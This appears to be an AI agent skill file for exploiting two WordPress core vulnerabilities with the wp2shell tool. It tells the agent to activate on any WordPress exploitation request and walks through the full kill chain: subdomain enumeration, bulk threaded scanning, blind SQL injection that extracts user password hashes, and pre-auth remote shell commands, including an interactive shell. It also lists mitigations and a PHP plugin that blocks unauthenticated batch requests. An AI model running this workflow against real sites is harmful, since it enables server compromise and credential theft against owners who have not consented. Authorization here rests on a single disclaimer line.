# WordPress RCE Hunter — CVE-2026-63030 / CVE-2026-60137

Elite WordPress CVE hunting skill for authorized bug bounty, pentests, and CTFs. ALWAYS activate for: WordPress, WordPress CVE, wp2shell, CVE-2026-63030, CVE-2026-60137, WordPress RCE, WordPress pre-auth RCE, WordPress SQLi, WordPress REST API batch confusion, WordPress subdomain takeover, WordPress vulnerability, WordPress unauthenticated RCE, "find WordPress on $target", "check WordPress version", "scan WordPress for CVEs", or ANY request to find/test/exploit WordPress core vulnerabilities. Drives the full kill chain: subdomain recon → WordPress detection → version fingerprint → CVE mapping → exploitation → PoC → report.

**Authorized testing only — bug bounty in-scope, pentest engagement, or CTF.**

## Tooling

### wp2shell.py (CVE-2026-63030 + CVE-2026-60137 PoC)
- **Source:** `/tmp/wp2shell/wp2shell.py`  
  (Python 3.7+, stdlib only, no dependencies)
- **Targets:** WordPress 6.9.0-6.9.4, 7.0.0-7.0.1 (full RCE chain), 6.8.0-6.8.5 (SQLi only with facilitating plugin)
- **Commands:**
  - `check` — fingerprint + non-destructive confusion + SQLi confirmation
  - `read` — blind SQLi extraction (users, config, custom queries)
  - `shell` — authenticated RCE via plugin upload
  - `scan` — threaded bulk scan over a URL list
  - `sqli` — direct `author__not_in` SQLi against a facilitating sink

### wp2shell Nuclei Template
- **Source:** `/tmp/wp2shell-scanner/wp2shell-exposure.yaml`
- Detects version fingerprint + batch endpoint exposure

## Workflow

### Phase 1: Target Discovery
1. **Given a root domain**, find WordPress subdomains:
   - Use subfinder / assetfinder / amass for subdomain enumeration
   - Filter for common WordPress patterns: `wp-`, `blog`, `wp-admin`, `wordpress`, `cms`
   - Check known WordPress indicators: `/wp-json/`, `/wp-content/`, `/wp-admin/`, `/wp-login.php`, `/xmlrpc.php`, `generator="WordPress"`

### Phase 2: Version Fingerprint
For each WordPress target:
```bash
python3 /tmp/wp2shell/wp2shell.py check https://target
```
This fingerprints the version and checks if the batch endpoint is reachable.

### Phase 3: Scan
For bulk targets:
```bash
python3 /tmp/wp2shell/wp2shell.py scan targets.txt --threads 10 --json results.json --prove
```

Or use Nuclei:
```bash
nuclei -t /tmp/wp2shell-scanner/wp2shell-exposure.yaml -l targets.txt -o results.txt
```

### Phase 4: Exploitation (authorized targets only)
```bash
# Confirm vulnerability
python3 /tmp/wp2shell/wp2shell.py check https://target

# Extract data (users + password hashes)
python3 /tmp/wp2shell/wp2shell.py read https://target --preset users

# Get shell (crack-free pre-auth RCE — no password needed)
python3 /tmp/wp2shell/wp2shell.py shell https://target --cmd id
python3 /tmp/wp2shell/wp2shell.py shell https://target -i  # interactive

# Scan with proof extraction
python3 /tmp/wp2shell/wp2shell.py scan https://target --prove
```

### Phase 5: Report
- Version fingerprint + CVE assignment
- Proof of concept with terminal output
- Impact assessment (pre-auth RCE → full server compromise)
- Remediation: upgrade to WordPress 6.9.5+ / 7.0.2+

## Indicators of WordPress
| Check | Location |
|-------|----------|
| Generator meta tag | `<meta name="generator" content="WordPress X.Y.Z"` |
| REST API root | `/wp-json/` or `/?rest_route=/` |
| Batch endpoint | `/wp-json/batch/v1` or `/?rest_route=/batch/v1` |
| Login page | `/wp-login.php` |
| XML-RPC | `/xmlrpc.php` |
| WP content | `/wp-content/` |

## Caveats
- **Object cache (Redis/Memcached) blocks the chain** — the sink is only reached when a persistent object cache is NOT in use. Even if batch endpoint is open (HTTP 207), the SQLi may fail.
- **Batch endpoint must return HTTP 207** — 403/404 means WAF or plugin blocking. 403 can sometimes be bypassed (see Mitigation).
- **Query string route `/?rest_route=/batch/v1`** must also be checked — WAF blocking only `/wp-json/batch/v1` is insufficient.

## Version → Vulnerability Map
| Version Range | Status |
|--------------|--------|
| < 6.9.0 | Not affected (no batch confusion) |
| 6.9.0 – 6.9.4 | **VULNERABLE** — full pre-auth RCE chain, fixed in 6.9.5 |
| 7.0.0 – 7.0.1 | **VULNERABLE** — full pre-auth RCE chain, fixed in 7.0.2 |
| 6.8.0 – 6.8.5 | SQLi only (batch confusion not present) |
| 6.9.5+ / 7.0.2+ | Patched |

## Mitigation
Three options for site owners:
1. **Update** to 7.0.2 (or 6.9.5 on the 6.9 branch)
2. **WAF** — block both `/wp-json/batch/v1` (path) and `/?rest_route=/batch/v1` (query string). Both patterns MUST be blocked.
3. **Disable WP REST API** — plugin to disable unauthenticated REST API access

`rest_pre_dispatch` must-use plugin to block unauthenticated batch requests:
```php
<?php
defined( 'ABSPATH' ) || exit;
function wporg_require_authentication_for_rest_batch( $result, $server, $request ) {
    if ( '/batch/v1' !== strtolower( untrailingslashit( $request->get_route() ) ) || is_user_logged_in() ) {
        return $result;
    }
    return new WP_Error(
        'rest_batch_authentication_required',
        'Authentication is required to use the batch API.',
        array( 'status' => 401 )
    );
}
add_filter( 'rest_pre_dispatch', 'wporg_require_authentication_for_rest_batch', -1000, 3 );
```

## References
- CVE-2026-63030: REST API batch route confusion
- CVE-2026-60137: WP_Query `author__not_in` SQLi
- https://github.com/0xsha/wp2shell
- https://github.com/ZephrFish/wp2shell-scanner
- https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/
